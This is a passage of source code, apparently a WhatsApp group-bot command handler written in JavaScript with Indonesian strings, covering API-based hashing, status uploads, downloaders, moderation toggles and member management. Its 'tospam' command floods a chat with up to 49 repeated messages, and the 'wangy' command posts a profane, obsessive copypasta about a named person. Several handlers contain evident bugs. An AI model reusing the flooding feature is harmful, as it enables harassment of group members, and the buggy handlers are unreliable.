					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha256?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result.encrypt)
					break
					case 'sha512enc': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha512?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result.encrypt)
					break
					case 'encbinary':
				encbinary = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?encode=${encbinary}`, {method: 'get'})
					ronove.sendMessage(from, `${anu.result}`, text, {quoted: fdoc})
					break  
				case 'decbinary':
				   decbin = `${body.slice(11)}`
					anu = await fetchJson(`https://api.anoncybfakeplayer.com/api/binary/?decode=${decbin}`, {method: 'get'})
					ronove.sendMessage(from, `${anu.result}`, text, {quoted: fdoc})
					break
        case 'd':
        case 'del':
        case 'delete': // MR.CYSER
               try {
               if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot')
               ronove.deleteMessage(from, {id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
               } catch (e){
               reply('Reply chat bot')
}
               break

case 'sᴄʀɪᴘᴛ':
		case 'sc':
		case 'sourcecode':
		if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
		ronove.sendMessage(from, { text: "BELI LAH SAMA OWNERKU AWOKAWOKAWOK", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
	case 'upswteks':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    ronove.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    ronove.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${namaowner}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ronove.downloadMediaMessage(encmedia)
						ronove.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ronove.downloadMediaMessage(encmedia)
						ronove.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await ronove.downloadMediaMessage(encmedia)
						ronove.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var konti = body.slice(11)
                    sticWait(from)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await ronove.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    ronove.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var konti = body.slice(7)
                    sticWait(from)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ronove.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    ronove.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var teksyy = body.slice(11)
                    sticWait(from)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await ronove.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    ronove.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				return ronove.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
      case "delcmd":
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
        case 'testag':
        mention(`*Perintah ini Khusus @${owner} !*`, [`${owner}@s.whatsapp.net`], true)
        break
case 'banchat':
if (!isGroup) return reply(mess.only.group)
if (!itsMe && isOwner && !isGroupAdmins)return mentions(`*Perintah ini Khusus @${owner} !*`, [`${owner}@s.whatsapp.net`], true)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break
       case 'scplay': 
       case 'soundcloud':
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('soundcloud')) return reply(mess.error.Iv)
              sticWait(from)
              anu = await fetchJson(`https://api.xteam.xyz/dl/soundcloud?url=${q}&APIKEY=${xteamkey}`)
             .then((data) => { sendMediaURL(from, data.result.dataurl, mek) })
             .catch((err) => { reply(String(err)) })
              break
       case 'jippy':
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('zippyshare')) return reply(mess.error.Iv)
              sticWait(from)
              anu = await fetchJson(`https://velgrynd.herokuapp.com/api/zippyshare?url=${q}`)
             .then((data) => { sendMediaURL(from, data.result.hasil.link, mek) })
             .catch((err) => { reply(String(err)) })
              break//dahlah capek
case 'gdb':
              if (!q) return reply('Link Yang Mana? ')
              if (!q.includes('drive.google.com')) return reply(mess.error.Iv)
              sticWait(from)
              anu = await fetchJson(`https://api.xteam.xyz/dl/drive?url=${q}&APIKEY=${xteamkey}`)
             .then((data) => { sendMediaURL(from, data.result.server2, mek) })
             .catch((err) => { reply(String(err)) })
              break
        case 'shopee':
               try {
               if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
               query = args.join(" ")
               sticWait(from)
               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${zekskey}&q=${query}`)
               get_data = get_data.data
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE* 
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
teks += `\`\`\`〆⁩ Nama : ${get_data[i].name}\`\`\`
\`\`\`〆⁩ Harga : ${get_data[i].harga}\`\`\`
\`\`\`〆⁩ Terjual : ${get_data[i].terjual}\`\`\`
\`\`\`〆⁩ Lokasi : ${get_data[i].location}\`\`\`
\`\`\`〆⁩ Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`〆⁩ Stok : ${get_data[i].stock}\`\`\`
\`\`\`〆⁩ Informasi : ${get_data[i].information}\`\`\`
\`\`\`〆⁩ Link : ${get_data[i].url}\`\`\``
}
              ini_buffer = await getBuffer(get_data[0].img_detail[0])
              ronove.sendMessage(from, ini_buffer, image, { quoted: fdoc, caption: teks })
              } catch {
              reply(`Maaf produk ${query} tidak ditemukan`)
}
              break
case 'zippy':
if (!q) return reply(`link zippysharenya lah kak`)
sticWait(from)
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/zippyshare?url=${args[0]}`, {method: 'get'})
depresi = await getBuffer(anu.result.link)
ronove.sendMessage(from, depresi, document, { mimetype: 'document/zip', quoted: mek})
break
case 'asahotak':
					anu = await fetchJson(`https://velgrynd.herokuapp.com/api/asahotak`, {method: 'get'})
					asahh = `${anu.result.soal}`
					setTimeout( () => {
					ronove.sendMessage(from, 'Jawaban: '
                                          +anu.result.jawaban, text, {quoted: fgif}) // ur cods
					}, 60000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_10 Detik lagi..._', text) // ur cods
					}, 50000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_20 Detik lagi..._', text) // ur cods
					}, 40000) // 1000 = 1s,
                                        setTimeout( () => {
					ronove.sendMessage(from, '_30 Detik lagi..._', text) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_40 Detik lagi..._', text) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_50 Detik lagi..._', text) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, '_60 Detik lagi..._', text) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					ronove.sendMessage(from, asahh, text, {quoted: fgif}) // ur cods
					}, 0) // 1000 = 1s,
					break
break
case 'unbanchat':
if (!itsMe && !isOwner)return sticOwner(from)
if (!isBanchat) return reply(`udah di UnBan`)
let ubc = bancht.indexOf(from)
bancht.splice(ubc, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
break

case 'listbanchat': case 'listbc':
 teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
for(let i of bancht){
met = await ronove.groupMetadata(i)
teks += 'Id : ' + i + '\n'
teks += 'Nama Group : ' + met.subject + '\n\n'
}
reply(teks)
break
      case "antilink":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
       case 'autoketik':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Succes mengaktifkan autoketik`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Succes mematikan autoketik`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succes mengaktifkan autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Succes mematikan autovn`)
} else {
reply(`Pilih on atau off`)
}
break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if(antical)return reply('Sudah diaktifkan sebelumnya!')
antical = true
reply(`Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('Sudah di NonAktifkan sebelumnya!')
antical = false
reply(`Succes mematikan anticall`)
} else {
reply(`Pilih on atau off`)
}
break

case 'autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Succes mematikan group`)
} else {
reply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succes mengaktifkan autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Succes mematikan autoread pc`)
} else {
reply(`Pilih on atau off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
      case "autojoin":
        if (!isGroup) return reply("Khusus di grup");
        if (!mek.key.fromMe) return reply("Khusus owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >-------------------
      case "listonline": //copas dari stikerinbot
    if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})  
  let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        try {
          let online = [
            ...Object.keys(ronove.chats.get(id).presences),
            ronove.user.jid,
          ];
          ronove.reply(
            m.chat,
            "┌─〔 Daftar Online 〕\n" +
              online.map((v) => "├ @" + v.replace(/@.+/, "")).join`\n` +
              "\n└────",
            m,
            {
              contextInfo: { mentionedJid: online },
            }
          );
         } catch (e) {
          m.reply("");
        }
        break;
     
           case 'wangy':
                 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
              if (!q) return reply ('NAMANYA SAPA BRO')
              name = args[0]
              wangy = `${name} ${name} ${name} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${name} wangyy aku mau nyiumin aroma wangynya ${name} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${name} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${name} AAAAA LUCCUUUUUUUUUUUUUUU............ ${name} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${name} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${name} gw ... ${name} di laptop ngeliatin gw, ${name} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${name} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${name} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(wangy)
              break;

      case "sider": //copas dari stikerinbot
        if (!m.quoted) return reply(`REPLY PESAN BOT OY`);
        let members = m.quoted.chat.endsWith("g.us")
          ? (await ronove.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await ronove.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        m.reply(txt, null, {
          contextInfo: {
            mentionedJid: ronove.parseMention(txt),
          },
        });
        break;
      case "q":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!m.quoted) return reply("reply message!");
        let qse = ronove.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          ronove.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          ronove.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          ronove.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
      case "add":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return sticAdmin(from)
        if (!isBotGroupAdmins) return sticNotAdmin(from)
      if (!q) return reply (`yg mau ditambahin hantu yah?`)
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
             entah = q.split("|")[0]
             entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
             entah = `${entah}@s.whatsapp.net`
             ronove.groupAdd(from, [entah])
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             ronove.groupAdd(from, [entah])
}
             break;
      case "getbio":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await ronove.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
      // Get Name
      case "getname":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          ronove.contacts[ambl] != undefined
            ? ronove.contacts[ambl].sname || ronove.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (!isGroup) return;
        ronove.groupUpdateDescription(from, `${args.join(" ")}`);
        ronove.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
      // Set Name Group
      case "setname":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (!isGroup) return;
        ronove.groupUpdateSubject(from, `${args.join(" ")}`);
        ronove.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break;
      // Group Info
      case "groupinfo":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!isGroup) return;
        ppUrl = await ronove.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        ronove.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`,
        });
        break;
      // Demote Admins
      case "demote":
         if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        ronove.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        ronove.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case "promote":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        ronove.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        ronove.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "closegc":
            if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return sticNotAdmin(from)
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        ronove.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break; 
case 'tospam':
      if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  ronove.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ronove.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await ronove.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ronove.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await ronove.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  ronove.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await ronove.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  ronove.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
      case "revoke":
